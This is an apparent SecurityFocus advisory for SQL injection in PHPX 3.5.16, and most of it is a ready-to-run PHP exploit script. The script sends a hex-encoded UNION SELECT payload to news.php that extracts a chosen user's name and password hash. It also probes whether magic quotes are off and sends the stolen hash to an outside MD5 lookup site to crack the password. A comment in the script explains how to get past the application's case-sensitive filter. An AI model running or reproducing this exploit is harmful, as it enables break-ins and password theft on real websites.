source: http://www.securityfocus.com/bid/23033/info
   
PHPX is prone to multiple input-validation vulnerabilities because the application fails to properly sanitize user-supplied input.
   
Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, execute arbitrary script code in the context of the webserver process, compromise the application, obtain sensitive information, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
   
<?php

error_reporting(0);
ini_set("default_socket_timeout",5);
set_time_limit(0);



/*
   ---------------------------------------------------
   PHP X 3.5.16 (news_id) Remote SQL Injection Exploit
   ---------------------------------------------------
   By StAkeR[at]hotmail[dot]it
   Download On http://www.phpx.org/project.php
   NOTE: Magic_Quotes_GPC OFF
   ---------------------------------------------------
   
   File (admin/includes/news.inc.php)
   
   1. <?php
   2. #$Id: news.inc.php,v 1.46 2006/12/18 05:51:47 ryan Exp $
   3.
   4.
   5. class newsModule{
   6.
   7. function newsModule(){
   8.
   9.
  10.
  11. $this->action = $_GET['action'];
  12. $this->news_id = $_GET['news_id'];
  13.
  14. global $userinfo;
  15. global $core;
  16.
  17. $this->core = $core;
  18.
  19. $this->userinfo = $userinfo;
  20.
  21.
  22.
  23.
  24. if (!$this->userinfo){ DIE("HACK ATTEMPT"); }
  25. if ($this->userinfo[news] != 1){ DIE("NO ACCESS TO THIS MODULE"); }
  26.
  27. include("includes/text.inc.php");
  28. $this->textFun = new textFunctions();
  29. $this->newsCat = $this->core->db->dbCall("news_categories");
  30. if ($this->news_id == ''){ $this->news_id = $_POST['news_id']; }
  31.
  32. switch($this->action){
  33. case "catrss":
  34. $this->catRSS();
  35. break;
      ...
   
   i've found other bugs..:D
  

   news.php?action=view&news_id=1 ' union all select 1,2,username,4,5,password,7,8 from users where user_id=1/*
   Result? HACKING ATTEMPT...but this fix is very stupid because isn't case sensitive...
   news.php?action=view&news_id=1 ' UNION ALL SELECT 1,2,username,4,5,password,7,8 from users where user_id=1/*
   
 
  
*/   


$search = new search;


if(preg_match('/http://(.+?)/i',$argv[1]) or !is_numeric($argv[2])) $search->argv();


$uid = intval($argv[2]);
$host = explode('/',$argv[1]);
$search->magic();

$code = "\x31\x25\x32\x30\x25\x32\x37\x25\x32".
        "\x30\x55\x4E\x49\x4F\x4E\x25\x32\x30".
        "\x41\x4C\x4C\x25\x32\x30\x53\x45\x4C".
        "\x45\x43\x54\x25\x32\x30\x31\x25\x32".
        "\x43\x32\x25\x32\x43\x75\x73\x65\x72".
        "\x6E\x61\x6D\x65\x25\x32\x43\x34\x25".
        "\x32\x43\x35\x25\x32\x43\x70\x61\x73".
        "\x73\x77\x6F\x72\x64\x25\x32\x43\x37".
        "\x25\x32\x43\x38\x25\x32\x30\x66\x72".
        "\x6F\x6D\x25\x32\x30\x75\x73\x65\x72".
        "\x73\x25\x32\x30\x77\x68\x65\x72\x65".
        "\x25\x32\x30\x75\x73\x65\x72\x5F\x69".
        "\x64\x25\x33\x44".$uid."\x25\x32\x33";
        


$data .= "GET /$host[1]/news.php?action=view&news_id=$code HTTP/1.1\r\n"; 
$data .= "Host: $host[0]\r\n";
$data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
$data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
$data .= "Accept-Language: en-us,en;q=0.5\r\n";
$data .= "Accept-Encoding: gzip,deflate\r\n";
$data .= "Connection: close\r\n\r\n";
    
  
  
if(!$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP)) die("socket_create() error!\r\n");
if(!socket_set_option($socket,SOL_SOCKET,SO_BROADCAST,1)) die("socket_set_option() error!\r\n"); 
if(!socket_connect($socket,gethostbyname($host[0]),80)) die("socket_connect() error!\r\n");
if(!socket_write($socket,$data,strlen($data))) die("socket_write() errror!\r\n");

while($html = socket_read($socket,1024,PHP_NORMAL_READ)) 
{ 
  $content .= $html; 
} socket_close($socket);



if(preg_match('/<br><br>([0-9a-f]{32})/',$content,$result))
{
  echo "[+] Exploit Successfully!\r\n";
  echo "[+] Hash: $result[1]\r\n";
  echo $search->md5($result[1]);

}
else
{
  echo "[+] Exploit Failed!\r\n";
  echo "[+] Site Not Vulnerable / ID Not Valid!\r\n";
  exit;
}

class search
{
  function md5($hash)
  {
    if(strlen($hash) != 32) die("hash not valid!\r\n");
  
    $data .= "GET /?p&submit&s=md5&q=$hash&_= HTTP/1.1\r\n"; 
    $data .= "Host: md5.rednoize.com\r\n";
    $data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
    $data .= "Connection: close\r\n\r\n";
  
    if(!$socket = fsockopen('md5.rednoize.com',80)) die("fsockopen() error!\n");  
    if(!fputs($socket,$data)) die("fputs() error!\n");


    while(!feof($socket))
    {
      $content .= fgets($socket);
    } fclose($socket);
  
    $result = explode(' ',$content);
  
    if(isset($result[19]))
    {
      return "[+] Password: ".substr($result[19],20,-6)."\r\n";
    }
  }
  
  function argv()
  {
    echo "[+] PHP X 3.5.16 (news_id) Remote SQL Injection Exploit\r\n";
    echo "[+] Usage: php $argv[0] [host/path] [user_id]\r\n";
    echo "[+] Usage: php $argv[0] localhost/phpx 1\r\n";
    exit;
  }
  
  function magic()
  {
    global $host;
    
    $data .= "GET /$host[1]/news.php?action=view&news_id=' HTTP/1.1\r\n"; 
    $data .= "Host: $host[0]\r\n";
    $data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
    $data .= "Connection: close\r\n\r\n";
  
    if(!$socket = fsockopen($host[0],80)) die("fsockopen() error!\n");  
    if(!fputs($socket,$data)) die("fputs() error!\n");

    while(!feof($socket))
    {
      $content .= fgets($socket);
    } fclose($socket);
    
    if(!eregi('error in your SQL',$content))
    {
      echo "[+] Magic Quotes On!\r\n[+] Exploit Failed!\r\n";
      exit;
    }
  }
}